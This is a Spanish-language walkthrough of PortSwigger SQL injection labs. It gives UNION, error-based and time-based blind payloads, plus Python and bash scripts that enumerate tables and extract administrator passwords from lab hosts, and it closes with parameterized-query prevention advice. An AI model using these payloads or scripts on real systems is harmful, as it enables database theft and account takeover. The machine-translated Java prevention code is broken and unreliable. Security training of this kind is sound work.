---
description: https://portswigger.net/web-security/sql-injection
---

# SQL injection

La inyección de SQL es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza en su base de datos. ‎Hay una amplia variedad de vulnerabilidades de inyección SQL, ataques y técnicas, que surgen en diferentes situaciones. Algunos ejemplos comunes de inyección SQL incluyen:‎

* **Retrieving hidden data**, donde puede modificar una consulta SQL para devolver resultados adicionales.‎ 
* **Subverting application logic**, donde puede cambiar una consulta para interferir con la lógica de la aplicación.‎ 
* **UNION attacks,** donde puede recuperar datos de diferentes tablas de base de datos.‎ 
* **Examining the database**, donde puede extraer información sobre la versión y la estructura de la base de datos. 
* **Blind SQL injection**, donde los resultados de una consulta que controla no se devuelven en las respuestas de la aplicación.

![](<../../.gitbook/assets/image (109).png>)

## Retrieving hidden data

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

En este ejercicio debemos se debe de mostrar todos los items a través de una inyeccion SQL, para empezar abrimos Burp Suite e interceptamos la petición GET hacia alguna categoría, como 'Gifts' o 'Lifestyle'. Esta petición la mandamos al **Repeater** con** ctrl + r**.

![](<../../.gitbook/assets/image (77).png>)

Ahora hacemos un query para devolver todos los items. Hay muchas maneras de hacerlo, la siguiente solo es una de muchas **+OR+1%3d1-- **enviamos la petición. Básicamente se estaría ejecutando el siguiente query, donde 1 es igual a 1 y por lo tanto mostrara todos los productos.

```sql
SELECT * FROMproducts WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

En Burp Suite se realiza de la siguiente manera.

![](<../../.gitbook/assets/image (60).png>)

Vemos en el Render, nos ha traído todos los items.

![](<../../.gitbook/assets/image (41).png>)

## Subverting application logic

### Lab: SQL injection vulnerability allowing login bypass

Se nos dice que debemos de iniciar sesión con el usuario administrator. Podemos ver que al momento de poner una **' **en usarname y en password cualquier letra la aplicación lanza un error 500.

![](<../../.gitbook/assets/image (100).png>)

El error se produce por la sintaxis, ya que el query se quedaría sin ejecutar.

```sql
SELECT * FROM users WHERE username = ''' AND password = 'qwerty' 
```

Ahora si comentamos la **'** este error 500 desaparece, solo nos dice que el usuario y contraseña son inválidos.

![](<../../.gitbook/assets/image (111).png>)

El query sería algo como esto, vemos que no ejecutaría el último AND.

```sql
SELECT * FROM users WHERE username = ''--' AND password = 'qwerty' 
```

Por lo que, si nos sabemos el nombre de usuario, bastaría con agregarlo y obtener acceso.

![](<../../.gitbook/assets/image (3).png>)

Podemos ver en el query que solo comprueba que el usuario es igual a administrator y lo demás lo omite, porque está comentado.

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'qwerty' 
```

## Retrieving data from other database tables - SQL injection UNION attacks

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

Existen dos métodos para determinar el número de columnas mediante consultas, esta primera manera es incrementando el valor utilizando ORDER BY, empezando en el número uno y hasta que en la respuesta nos devuelva un mensaje de error, por lo tanto el número anterior que hayamos puesto es el número de columnas, el siguiente script en python nos ayuda a identificar el número de columnas utilizando ORDER BY, el cual nos dice que el número de columnas es 3.

```python
import requests

def obtener_columnas(URL):
    for columna in range(1,100):
        payload = URL + "'+ORDER+BY+{}--".format(columna)
        print("Realizando peticion a: {}".format(payload))
        
        #GET /filter?category=Pets'+ORDER+BY+3--
        response = requests.get(payload)

        if response.status_code == 500:
            num_columnas = columna - 1
            print("El codigo de estado es: {}\n".format(response.status_code)) 
            break
        
        print("El numero de columnas es {}\n".format(columna))

    print("El numero de columnas es: {}".format(num_columnas))
    
def main():
    URL = 'https://acd41f861fd34c0380581a8000d10016.web-security-academy.net/filter?category=Corporate+gifts'
    #Usando order by
    obtener_columnas(URL)

if __name__ == "__main__":
    main()
```

Esta segunda forma es utilizando la sentencia UNION SELECT, en donde el payload será un número X de valores NULL los cuales van a representar el número de columnas, el siguiente script en python con base en las sentencias UNION SELECT, determina la cantidad de columnas, el resultado son 3 columnas.

```python
import requests

def obtener_columnas(URL):
    for columna in range(0,100):
        char_null = ',NULL'
        payload = URL + "%27+UNION+SELECT+NULL{}--".format(char_null*columna)

        #GET /filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--
        print("Realizando peticion a: {}".format(payload))
        respuesta = requests.get(payload)
        print("Codigo de estado: {}\n".format(respuesta.status_code))

        if respuesta.status_code == 200:
            print("El numero de columna es: {}".format(columna+1))
            break

def main():
    URL = 'https://ac761f141e795bc480c0744a003c00c3.web-security-academy.net/filter?category=Lifestyle'
    #Usando union
    obtener_columnas(URL)

if __name__ == "__main__":
    main()
```

### Lab: SQL injection UNION attack, finding a column containing text

Ahora debemos determinar cuál es la columna en donde se pueden intentar datos de tipo string, previamente debemos de saber el número de columnas para ir rellenando cada columna con un dato de tipo string.

* ' UNION SELECT 'a',NULL,NULL,NULL--
* ' UNION SELECT NULL,'a',NULL,NULL--
* ' UNION SELECT NULL,NULL,'a',NULL--
* ' UNION SELECT NULL,NULL,NULL,'a'--

Por lo que el siguiente script realiza todo el procedimiento para detectar las columnas y la columna con el tipo de dato string.

```python
import requests

def get_columns(URL):
    for column in range(1,100):
        payload = URL + "'+ORDER+BY+{}--".format(column)
        print("Realizando peticion a: {}".format(payload))
        
        #GET /filter?category=Pets'+ORDER+BY+3--
        response = requests.get(payload)

        if response.status_code == 500:
            num_columns = column - 1
            print("El codigo de estado es: {}\n".format(response.status_code)) 
            return num_columns
        
        print("El numero de columnas es {}\n".format(column))

def generate_null_vaules(columns):
    char_null = 'NULL'
    data = []
    for i in range(0,columns):
        data.append(char_null)
    return data

def find_valid_column(columns,values_null):

    check_vales_in_colums = []

    for i in range(0,columns):
        value = "'a'"
        values_null[i] = value
        values_null_str = ','.join(values_null)
        values_null[i] = 'NULL'
        check_vales_in_colums.append(values_null_str)
    
    return check_vales_in_colums

def send_payloads(URL,values):
    for value in values:
        paylaod = "{}'+UNION+SELECT+{}--".format(URL,value)
        
        response = requests.get(paylaod)

        if response.status_code == 200:
            print("El payload correcto es: {}".format(paylaod))

def main():
    URL = "https://acb31f7c1ef20b1780ea160500be00ab.web-security-academy.net/filter?category=Pets"

    columns = get_columns(URL)
    values_null = generate_null_vaules(columns)
    values = find_valid_column(columns,values_null)

    send_payloads(URL,values)

if __name__ == "__main__":
    main()
```

### Lab: SQL injection UNION attack, retrieving data from other tables

Utilizando el script del ejercicio anterior podemos obtener las columnas de tipo string, nos lanza dos resultados, eso quiere decir que hay dos columnas de tipo string. En el ejercicio ya se nos da la tabla llamada **users**, y también dos columnas, **username** y** password**. En caso contrario debemos de realizar más pasos para saber el nombre de estos datos, pero eso es tema de la sección **Examining the database**.

{% hint style="success" %}
Resultado del script:

El payload correcto es: https://ac351f6a1f8a06e180774a34006f0097.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+'a',NULL--

El payload correcto es: https://ac351f6a1f8a06e180774a34006f0097.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,'a'--
{% endhint %}

Por lo que si hacemos una petición con los datos proporcionados, de la siguiente manera:

{% hint style="success" %}
[https://ac351f6a1f8a06e180774a34006f0097.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+username,password+FROM+users--](https://ac351f6a1f8a06e180774a34006f0097.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+username,password+FROM+users--)
{% endhint %}

Podemos ver que se nos lista la información de la tabla **users**.

![](<../../.gitbook/assets/image (53).png>)

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

En caso de que no contemos con las columnas necesarias se pueden concatenar varios valores en una sola columna, por ejemplo, en el ejercicio anterior pudimos visualizar ambas columnas por separado porque se había encontrado que existían dos columnas de tipo string. Ahora cuando solo tenemos una columna y queremos concatenar los valores en una columna.

{% hint style="success" %}
Resultado del script:

El payload correcto es: [https://accc1f381f27b4f9808ca6aa008b0053.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,'a'--](https://accc1f381f27b4f9808ca6aa008b0053.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27a%27--)
{% endhint %}

Podemos ver que solo existe una sola columna de tipo string y se nos pide extraer datos de dos columnas, con el enlace de referencia podemos ver como se pueden concatenar las dos columnas y obtener los datos. Aunque primero deberíamos de identificar que motor de base de datos es para saber de qué manera se concatena, pero es tema de la sección **Examining the database**.

{% hint style="success" %}
Payload:  [%27+UNION+SELECT+NULL,username||%27:%27||password+FROM+users--](https://accc1f381f27b4f9808ca6aa008b0053.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27:%27||password+FROM+users--) 

[https://accc1f381f27b4f9808ca6aa008b0053.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27:%27||password+FROM+users--](https://accc1f381f27b4f9808ca6aa008b0053.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,username||%27:%27||password+FROM+users--)
{% endhint %}

Resultados.

![](<../../.gitbook/assets/image (78).png>)

## Examining the database

### Lab: SQL injection attack, querying the database type and version on Oracle

Primero determinamos el número de columnas de la siguiente manera (como es una base de datos Oracle, el query es distinto a como lo habíamos estado haciendo, podemos buscar el internet como realizarlo y adaptarlo):

* '+UNION+ALL+SELECT+null,null+FROM+dual--

Verificamos cuáles son las columnas de tipo string.

* '+UNION+ALL+SELECT+'a','a'+FROM+dual--

![Por lo que podemos ver cualquiera de las dos columnas es valida.](<../../.gitbook/assets/image (83).png>)

Ahora solo necesitamos buscar como podemos consultar la versión de la base de datos Oracle, podemos hacer uso de PayloadsAllTheThings o del cheat sheet de portswigger.

* '+UNION+ALL+SELECT+banner,null+FROM+v$version--

![Version de Oracle](<../../.gitbook/assets/image (36).png>)

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Comprobamos número de columnas (# es para comentar, en MySQL).

* '+UNION+SELECT+NULL,NULL#

Verificamos el tipo de dato, en este caso ambos son strings.

* '+UNION+SELECT+'a','a'#

Ahora consultamos la versión de la base de datos.

* '+UNION+SELECT+@@version,NULL#

![Version de MySQL](<../../.gitbook/assets/image (74).png>)

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

Comprobamos el número de columnas.

* '+UNION+SELECT+NULL,NULL--

Verificamos el tipo de dato, en este caso ambos son strings.

* '+UNION+SELECT+'a','a'--

Ahora listamos las tablas de la base de datos actual.

* '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

![Tablas](<../../.gitbook/assets/image (29).png>)

Ahora que sabemos el nombre de la tabla, podemos mostrar las columnas de esta.

* '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_etagep'--

![Columnas](<../../.gitbook/assets/image (33).png>)

Ahora que sabemos el nombre de las columnas y ya tenemos el nombre de la tabla, podemos extraer los datos.

* '+UNION+SELECT+username_fszmed,password_ekvglp+FROM+users_etagep--

![Datos](<../../.gitbook/assets/image (86).png>)

Este proceso podemos realizarlo en bash, de la siguiente manera:

```bash
#!/bin/bash

#obtenemos el nombre de la tabla
table=$(curl -s "https://ac1d1f331f94d0aa8024006100140018.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--" | html2text | grep users)

#obtenemos las columnas en la tabla users
columns=$(curl -s "https://ac1d1f331f94d0aa8024006100140018.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_etagep%27--" | html2text | grep -E "password|username" > columns)

#guardamos el nombre de las columnas en dos variables distintas
column_password=$(cat columns| grep password)
column_username=$(cat columns| grep username)

#realizamos la peticion con los datos para obtener el password del usuario administrator
curl -s "https://ac1d1f331f94d0aa8024006100140018.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+$column_username,$column_password+FROM+$table--" | html2text | grep administrator | awk '{ gsub(/[ ]+/," "); print }'
rm columns
```

Resultado.

![](<../../.gitbook/assets/image (13).png>)

### Lab: SQL injection attack, listing the database contents on Oracle

En este ejercicio haremos lo mismo que en el pasado pero con una base de datos Oracle.

Comprobamos el número de columnas.

* '+UNION+ALL+SELECT+null,null+FROM+dual--

Verificamos el tipo de dato, en este caso ambos son strings.

* '+UNION+ALL+SELECT+'a','a'+FROM+dual--

Ahora listamos las tablas de la base de datos actual.

* '+UNION+SELECT+table_name,NULL+FROM+all_tables--

![Tablas](<../../.gitbook/assets/image (88).png>)

Ahora que sabemos el nombre de la tabla, podemos mostrar las columnas de esta.

* '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_PXCWCO'--

![Tablas](<../../.gitbook/assets/image (43).png>)

Ahora que sabemos el nombre de las columnas y ya tenemos el nombre de la tabla, podemos extraer los datos.

* '+UNION+SELECT+USERNAME_JRSAZM,PASSWORD_LTANDX+FROM+USERS_PXCWCO--

![Columnas](<../../.gitbook/assets/image (92).png>)

## Blind SQL injection

### Lab: Blind SQL injection with conditional responses

Interceptamos la petición con burpsuite y la mandamos al repeater.

![](<../../.gitbook/assets/image (22).png>)

Ahora probamos a con una condicional **or 1=1**, esto para ver como se comporta.

![](<../../.gitbook/assets/image (15).png>)

Si hacemos lo mismo, pero con **or 1=2**, podemos ver que el mensaje no aparece por lo tanto sabemos que es vulnerable.

![](<../../.gitbook/assets/image (96).png>)

Ahora con base en la respuesta podemos ver la cantidad de columnas que tiene, al tratar de aumentar él las columnas con NULL, desaparece el mensaje por lo tanto, solo tiene una columna.

![x'UNION+SELECT+NULL--](<../../.gitbook/assets/image (56).png>)

Ahora con los datos proporcionados verificamos que el usuario Administrator existe.

![x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--](<../../.gitbook/assets/image (27).png>)

Ahora que sabemos que existe, debemos de comprobar la longitud del password, para ello hacemos uso de la función length(). Básicamente, vamos a estar iterando de x hasta 100 para determinar la longitud del password. Por ejemplo de la siguiente manera:

Esto sería correcto porque el password es mayor a 1.

* x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--

Cuando lleguemos al número 20, el mensaje de Welcome back!, ya no apareceré por lo tanto el password tiene de longitud 20.

* x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>20--

Ahora debemos utilizando la función substring(str,pos,len) y comparándolo con un carácter de a-z y 0-9, para identificar que carácter es en cada posición.

* str - Obligatorio, cadena de la que se va a extraer la subcadena.
* pos - Posición desde la que comienza la subcadena.
* len - Longitud de la subcadena a extraer, si se omite la subcadena contendrá todos los caracteres de str desde pos, len puede ser negativo.

x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,**1**,1)='**a**'--

La a y el 1, marcadas en negritas representan lo que vamos a iterar por una para el número representa la posición del carácter y en la posición del string representa el valor de esa posición, por lo tanto si en la posición 1 el carácter es x, aparecerá el mensaje de Welcome back!, porque esto es verdadero.

Este proceso se puede realizar con Burp Suite Intruder>Attack type>Cluster bomb, el problema es que al ser gratuito te limita mucho la cantidad de peticiones y es muy muy tardado, por lo que es mejor utilizar Python, si no contamos con la versión Pro.

```python
import requests
import re

def  extract_password(URL,length,PASSWORD,CHARACTERS,PATTEN):
    for i in range(1,length+1):
        for st in CHARACTERS:
            payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{},1)='{}'--".format(str(i),st)
            cookies_payload = {"TrackingId": payload}
            response = requests.get(URL, cookies=cookies_payload)
            if re.search(PATTEN, response.text):
                PASSWORD += st
            else:
                pass
    return PASSWORD

def verify_length(URL,PATTEN):
    
    for num in range(1,100):
        payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>{}--".format(num)
        cookies_payload = {"TrackingId": payload}
        response = requests.get(URL, cookies=cookies_payload)
        if re.search(PATTEN, response.text) :
           length = num
        else:
            return length+1

def main():
    URL = "https://acca1fa61f8da85780614ff900a50082.web-security-academy.net/filter?category=Gifts"
    CHARACTERS = "qwertyuiopasdfghjklzxcvbnm1234567890"
    PASSWORD = ""
    PATTEN = "Welcome back!"

    length = verify_length(URL,PATTEN)
    print("El password tiene de longitud: {}".format(length))
    
    password = extract_password(URL,length,PASSWORD,CHARACTERS,PATTEN)
    print("El password es: {}".format(password))

if __name__ == "__main__":
    main()
```

Resultado

![](<../../.gitbook/assets/image (80).png>)

### Lab: Blind SQL injection with conditional errors

Basándonos en el error provocado, podemos ver que es vulnerable, ya que la sentencia es errónea.

> TrachkingId='

![](<../../.gitbook/assets/image (103).png>)

En caso contrario cuando se envía una sentencia correcta, si responde.

> TrachkingId=''

![](<../../.gitbook/assets/image (16).png>)

Ahora debemos de comprobar que el error es de SQL, es decir,  que el error sea un error de sintaxis de SQL en lugar de un error de otro tipo. Primero enviamos una consulta inválida utilizando concatenación. Vemos que nos lanza un mensaje de error, pero esto puede ser por el tipo de base de datos. En Oracle, se requiere que las instrucciones SELECT especifiquen un nombre de tabla.

> TrackingId='||(SELECT+'')||'

![](<../../.gitbook/assets/image (104).png>)

Después enviamos una consulta con el nombre de una tabla válida, por ejemplo, dual. Esta tabla viene en las bases de datos Oracle de manera predeterminada. Aquí ya no recibimos el error, por lo tanto, podemos pensar que es una base de datos Oracle y que es vulnerable.

> TrackingId='||(SELECT+''+FROM+dual)||'

![](<../../.gitbook/assets/image (17).png>)

Ahora para reforzar lo anterior procedemos a ingresar el nombre de una tabla que no exista para comprobar que el query realmente se está procesando por el backend.

> TrackingId='||(SELECT+''+FROM+supertabla)||'

![](<../../.gitbook/assets/image (25).png>)

Ahora para identificar que la tabla users realmente existe, debemos de leer una fila de ella para comprobar que existe, solo se puede leer una fila para evitar romper la concatenación.

> TrackingId='||(SELECT+''+FROM+users+WHERE+ROWNUM+=+1)||'

![](<../../.gitbook/assets/image (11).png>)

Ahora podemos probar a desencadenar un error con base en una condicional, por ejemplo, comprobando que un 1=1 o 1=2 y después ejecutando una función. Esta primera parte provocará un error, porque se está dividiendo entre cero.

> TrackingId='||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||

![](<../../.gitbook/assets/image (67).png>)

Ahora vamos a ejecutarlo pero con la condición de 1=2 para comprobar el resultado. Vemos que como la condición no se cumple, no se provoca un error.

> TrackingId='||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||

![](<../../.gitbook/assets/image (110).png>)

Podemos usar este mismo comportamiento para determinar si existen datos específicos en una tabla, por ejemplo, determinar si el usuario administrador existe. 

> TrackingId='||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'

![](<../../.gitbook/assets/image (6).png>)

Ahora sabemos que el usuario administrador existe, debemos de determinar la longitud del password. Esto se puede realizar con Burp Suite, pero lo haremos con Python, en el query la condición debe de ser verdadera, lo que confirma que el password es mayor a uno por lo tanto nos lanzara error 500, eso quiere decir que cuando lleguemos al número exacto de la contraseña tendremos un 200.

Esto lo hace la función verify_length() en el script.

'||(SELECT+CASE+WHEN+length(password)>1+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'

Una vez que sepamos la longitud del password, debemos de extraer un solo carácter y probarlo con un valor específico, utilizando la funcion SUBSTR(). El ataque recorrerá cada posición y el valor posible, probando uno a la vez. Por ejemplo, el primer carácter de password, se va a iterar con un valor, hasta que la condición se cumpla y nos mande un error.

> '||(SELECT+CASE+WHEN+SUBSTR(password,1,1)='{VALOR}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'

Ahora ya tenemos el siguiente payload iterará él con el valor de la longitud del password de uno por uno hasta encontrar cada carácter del password.

Esto lo realiza la función extract_password() en el script.

'||(SELECT+CASE+WHEN+SUBSTR(password,{LENGTH},1)='{VALOR}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'

```python
import requests

def  extract_password(URL,length,PASSWORD,CHARACTERS):
    
    for i in range(1,length+1):
        for st in CHARACTERS:
            payload = "x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,{},1)='{}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--".format(str(i),st)
            cookies_payload = {"TrackingId": payload}
            response = requests.get(URL, cookies=cookies_payload)
            if response.status_code == 500:
                PASSWORD += st
                print("Codigo de estado: {} Password: {}".format(response.status_code,PASSWORD))
            else:
                pass
    return PASSWORD

def verify_length(URL):

    for num in range(1,100):
        payload = "'||(SELECT+CASE+WHEN+length(password)>{}+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'".format(num)
        cookies_payload = {"TrackingId": payload}
        response = requests.get(URL, cookies=cookies_payload)
        
        if response.status_code == 200:
            return num

def main():
    URL = "https://ac371f901f0db5bb805228a8005c00cb.web-security-academy.net/filter?category=Pets"
    CHARACTERS = "qwertyuiopasdfghjklzxcvbnm1234567890"
    PASSWORD = ""

    length = verify_length(URL)
    print("La longitud del password es: {}".format(length))

    password = extract_password(URL,length,PASSWORD,CHARACTERS)
    print("La contraseña es: {}".format(password))

if __name__ == "__main__":
    main()
```

Resultado.

![](<../../.gitbook/assets/image (30).png>)

### Lab: Blind SQL injection with time delays

‌Para el siguiente ejercicio, dado que no se muestra algún error o mensaje, la manera en la cual nos podemos dar cuenta es a través de retrasos en las peticiones, en este caso era una base de datos PostgreSQL.

> TrackingId=a'||pg_sleep(10)--

{% embed url="https://youtu.be/yGMlQYJxFq4" %}

### Lab: Blind SQL injection with time delays and information retrieval

Primero debemos de identificar que tipo de base de datos es, con base en los payloads.

![](<../../.gitbook/assets/image (95).png>)

Este ejemplo se trata de una base de datos PostgreSQL. Vemos que si se cumple la condición debe de tardar 10 segundos en responder la aplicación.

> TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

En caso contrario, esta responde inmediatamente.

> TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

Verificamos que el usuario administrator existe.

> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Ahora debemos de comprobar la longitud de la contraseña. Esto lo podemos hacer con Python, en el script de al final vemos un ejemplo, pero este es para extraer directamente la contraseña.

> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Una vez que tengamos la longitud de la contraseña, la longitud de esta es 20. Ahora podemos extraer la contraseña utilizando la función SUBSTRING(), como lo hemos estado haciendo anteriormente.

> TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

Por lo tanto este es el payload final, solo tendríamos que ir recorriendo la posición y el carácter, pero en esta ocasión se hace una comprobación de 10 segundos. Se demorará un tiempo pero no tanto como la versión Community de Burp Suite.

```python
import requests, time, sys, signal

url = "https://aca31f171e32d5cc803a02af00d500fe.web-security-academy.net/filter?category=Corporate+gifts"
characters = "0123456789abcdefghijklmnopqrstuvwxyz"
result = ""

def check(payload):
    cookies_payload = {"TrackingId": payload}
    time_start = time.time()
    response = requests.get(url, cookies=cookies_payload)
    time_end = time.time()
    
    if time_end - time_start > 10:
        return 1

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

for posicion in range(1,21):
    for caracter in characters:
        payload = "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,{},1)='{}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--".format(posicion,caracter)
        if check(payload):
            result += caracter
            print(result)
            break

print("Administrator password: {}".format(result))
```

Resultado:

![](<../../.gitbook/assets/image (54).png>)

### Lab: Blind SQL injection with out-of-band interaction

En curso (necesito un servidor DNS o burpsuite premium)...

### Lab: Blind SQL injection with out-of-band data exfiltration

En curso (necesito un servidor DNS o burpsuite premium)...

## Cómo detectar vulnerabilidades de inyección SQL

La inyección SQL se puede detectar manualmente mediante un conjunto sistemático de pruebas en cada punto de entrada de la aplicación. Esto normalmente implica:

* Enviar el carácter de comillas individuales ' y buscar errores u otras anomalías. 
* Enviar alguna sintaxis específica de SQL que se evalúa como el valor base (original) del punto de entrada y a un valor diferente y buscar diferencias en las respuestas de aplicación. 
* Enviar condiciones booleanas como OR 1=1 y OR 1=2 y buscar diferencias en las respuestas de la aplicación. 
* Envío de payloads diseñadas para desencadenar retrasos de tiempo cuando se ejecutan dentro de una consulta SQL y en busca de diferencias en el tiempo que se tarda en responder. 
* Envío de payloads OAST diseñadas para desencadenar una interacción de red out-of-band a cuando se ejecuta dentro de una consulta SQL y la supervisión de cualquier interacción resultante.

## Inyección SQL en diferentes partes de la consulta

La mayoría de las vulnerabilidades de inyección SQL surgen dentro de la cláusula WHERE de una consulta SELECT. Este tipo de inyección SQL es generalmente bien entendido por probadores experimentados.

Pero las vulnerabilidades de inyección SQL pueden ocurrir en principio en cualquier ubicación dentro de la consulta y dentro de diferentes tipos de consulta. Las otras ubicaciones más comunes donde surge la inyección SQL son:

* En las instrucciones UPDATE, dentro de los valores actualizados o la cláusula WHERE.
* En instrucciones INSERT, dentro de los valores insertados.
* En instrucciones SELECT, dentro del nombre de la tabla o columna.
* En instrucciones SELECT, dentro de la cláusula ORDER BY.

### Cómo prevenir la inyección de SQL

La mayoría de las instancias de la inyección sql se pueden prevenir mediante consultas parametrizadas en lugar de concatenación de cadenas dentro de la consulta.

El código siguiente es vulnerable a la inyección sql porque la entrada del usuario se concatena directamente en la consulta:

```java
Consulta de cadena = "SELECT * FROM products WHERE category = '"+ input + "'";
Instrucción = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Este código se puede reescribir fácilmente de una manera que impide que la entrada del usuario interfiera con la estructura de consulta:

```java
Instrucción PreparedStatement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, entrada);
ResultSet resultSet = statement.executeQuery();
```

Las consultas parametrizadas se pueden usar para cualquier situación en la que la entrada que no sea de confianza aparezca como datos dentro de la consulta, incluida la cláusula WHERE y los valores de una instrucción INSERT o UPDATE. No se pueden usar para controlar la entrada que no es de confianza en otras partes de la consulta, como los nombres de tabla o columna, o la cláusula ORDER BY. La funcionalidad de la aplicación que coloca datos que no son de confianza en esas partes de la consulta tendrá que adoptar un enfoque diferente, como la lista blanca de valores de entrada permitidos, o el uso de una lógica diferente para entregar el comportamiento necesario.

Para que una consulta parametrizada sea eficaz para evitar la inyección sql, la cadena que se usa en la consulta siempre debe ser una constante codificada de forma activa y nunca debe contener datos de variables de ningún origen. No se sienta tentado a decidir caso por caso si se confía en un elemento de datos y continúe utilizando la concatenación de cadenas dentro de la consulta para los casos que se consideran seguros. Es demasiado fácil cometer errores sobre el posible origen de los datos, o que los cambios en otro código infrinjan las suposiciones sobre qué datos están contaminados. 

## Enlace de referencia

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

{% embed url="http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html" %}

{% embed url="https://stackoverflow.com/questions/30056598/how-to-identify-column-types-during-sql-injection" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}

{% embed url="https://github.com/payloadbox/sql-injection-payload-list" %}



